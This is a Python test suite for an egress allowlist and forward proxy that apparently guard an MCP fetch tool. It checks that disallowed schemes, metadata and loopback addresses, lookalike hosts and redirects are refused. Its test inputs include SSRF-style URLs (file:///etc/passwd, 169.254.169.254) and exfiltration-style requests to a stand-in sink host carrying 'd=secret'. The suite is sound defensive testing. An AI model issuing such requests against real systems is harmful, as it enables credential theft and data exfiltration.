"""Test suite for the egress URL policy and the enforcing forward proxy.

Validates:
1. Only allowed schemes and allowlisted hosts pass; DNS is resolved and
   loopback / link-local (metadata) / private addresses are refused, with
   private ranges permitted only for hosts listed in ``private_hosts``.
2. The proxy refuses a disallowed fetch at Layer 1 before forwarding.
3. The egress guard forwards allowed requests and re-validates every
   redirect hop, refusing a redirect to a host off the allowlist.
"""

from __future__ import annotations

import asyncio
import pathlib
from unittest.mock import AsyncMock, patch

import httpx
import pytest
from fastapi.testclient import TestClient

from src.engine import egress as egress_mod
from src.engine.egress import EgressGuard, EgressPolicy, address_allowed
from src.engine.state_machine import SessionGraphManager
from src.main import create_app
from src.models.policy import EgressConfig, PolicyConfig

pytestmark = pytest.mark.egress

_POLICY_PATH = pathlib.Path(__file__).resolve().parent.parent / "config" / "policy.yaml"
_RealAsyncClient = httpx.AsyncClient


def _policy(addresses: dict[str, list[str]], **config) -> EgressPolicy:
    async def resolve(host: str, port: int) -> list[str]:
        if host not in addresses:
            raise OSError("name does not resolve")
        return addresses[host]

    config.setdefault("allowed_hosts", ["docs.example.com", "fixtures"])
    config.setdefault("private_hosts", ["fixtures"])
    return EgressPolicy(EgressConfig(**config), resolver=resolve)


_ADDRESSES = {
    "docs.example.com": ["93.184.216.34"],
    "fixtures": ["172.18.0.4"],
}


def _check(url: str, addresses=_ADDRESSES, **config):
    return asyncio.run(_policy(addresses, **config).check(url))


# ===========================================================================
# 1. URL policy
# ===========================================================================

class TestUrlPolicy:

    def test_allowlisted_public_host_allowed(self):
        verdict = _check("https://docs.example.com/page?x=1")
        assert verdict.allowed
        assert verdict.addresses == ("93.184.216.34",)
        assert verdict.port == 443

    def test_private_host_allowed_only_when_listed(self):
        assert _check("http://fixtures:9001/fixtures/a.html").allowed
        assert not _check("http://fixtures:9001/", private_hosts=[]).allowed

    @pytest.mark.parametrize(
        "url",
        [
            "file:///etc/passwd",
            "ftp://docs.example.com/",
            "gopher://docs.example.com/",
            "//docs.example.com/",
            "http:///nohost",
        ],
    )
    def test_disallowed_schemes_and_hostless_urls_refused(self, url):
        assert not _check(url).allowed

    @pytest.mark.parametrize(
        "url",
        [
            "http://sink.invalid/collect?d=x",
            "http://docs.example.com.evil.test/",
            "http://evil.test/?h=docs.example.com",
            "http://169.254.169.254/latest/meta-data/",
            "http://unprotected:9000/",
        ],
    )
    def test_hosts_off_the_allowlist_refused(self, url):
        verdict = _check(url)
        assert not verdict.allowed
        assert "allowlist" in verdict.reason

    @pytest.mark.parametrize(
        "address",
        ["127.0.0.1", "::1", "169.254.169.254", "fe80::1", "0.0.0.0", "224.0.0.1", "::ffff:127.0.0.1", "100.64.0.1"],
    )
    def test_refused_address_classes_even_for_private_hosts(self, address):
        assert not address_allowed(address, allow_private=True)

    def test_rebinding_to_metadata_refused(self):
        verdict = _check("http://docs.example.com/", {"docs.example.com": ["93.184.216.34", "169.254.169.254"]})
        assert not verdict.allowed
        assert "169.254.169.254" in verdict.reason

    def test_unresolvable_host_fails_closed(self):
        assert not _check("http://docs.example.com/", {}).allowed

    def test_non_string_url_refused(self):
        assert not _check({"url": "http://docs.example.com/"}).allowed


# ===========================================================================
# 2. Layer 1 enforcement in the proxy
# ===========================================================================

class TestLayer1Egress:

    def test_shipped_policy_refuses_off_allowlist_fetch_before_forwarding(self):
        policy = PolicyConfig.from_yaml(_POLICY_PATH)
        engine = SessionGraphManager(policy)
        engine.evaluate_transition("egress-01", "list_directory")
        client = TestClient(create_app(policy_config=policy, graph_manager=engine))
        with patch("src.main.httpx.AsyncClient") as mock_client:
            instance = AsyncMock()
            mock_client.return_value.__aenter__.return_value = instance
            resp = client.post(
                "/mcp",
                json={"jsonrpc": "2.0", "id": 1, "method": "tools/call",
                      "params": {"name": "fetch", "arguments": {"url": "http://sink.invalid/?d=secret"}}},
                headers={"X-Session-ID": "egress-01"},
            )
        body = resp.json()
        assert body["error"]["code"] == -32602
        assert "egress allowlist" in body["error"]["message"]
        instance.post.assert_not_called()


# ===========================================================================
# 3. Egress guard (forward proxy) and redirect re-validation
# ===========================================================================

async def _upstream(redirect_to: str | None, seen: list[str]) -> asyncio.base_events.Server:
    """Tiny origin server: 302 to *redirect_to* on /start, 200 otherwise."""
    async def handle(reader, writer):
        head = await reader.readuntil(b"\r\n\r\n")
        path = head.split(b" ", 2)[1].decode()
        seen.append(path)
        if path == "/start" and redirect_to:
            writer.write(f"HTTP/1.1 302 Found\r\nLocation: {redirect_to}\r\nContent-Length: 0\r\nConnection: close\r\n\r\n".encode())
        else:
            writer.write(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok")
        await writer.drain()
        writer.close()
    return await asyncio.start_server(handle, "127.0.0.1", 0)


def _run_guard(redirect_to: str | None, url_path: str) -> tuple[int, list[str]]:
    async def scenario():
        seen: list[str] = []
        origin = await _upstream(redirect_to, seen)
        origin_port = origin.sockets[0].getsockname()[1]
        # "origin.test" stands in for an allowlisted public host served locally;
        # the test permits loopback for it only.
        policy = _policy({"origin.test": ["127.0.0.1"]}, allowed_hosts=["origin.test"], private_hosts=[])
        with patch.object(egress_mod, "address_allowed", lambda a, p: True):
            guard = await EgressGuard(policy).start("127.0.0.1", 0)
            guard_port = guard.sockets[0].getsockname()[1]
            async with _RealAsyncClient(proxy=f"http://127.0.0.1:{guard_port}", follow_redirects=True) as c:
                resp = await c.get(f"http://origin.test:{origin_port}{url_path}")
            guard.close()
        origin.close()
        return resp.status_code, seen
    return asyncio.run(scenario())


class TestEgressGuard:

    def test_allowed_request_is_forwarded(self):
        status, seen = _run_guard(None, "/page")
        assert status == 200
        assert seen == ["/page"]

    def test_redirect_to_off_allowlist_host_refused(self):
        status, seen = _run_guard("http://sink.invalid/collect?d=secret", "/start")
        assert status == 403
        assert seen == ["/start"]  # the origin was reached once; the redirect target never was
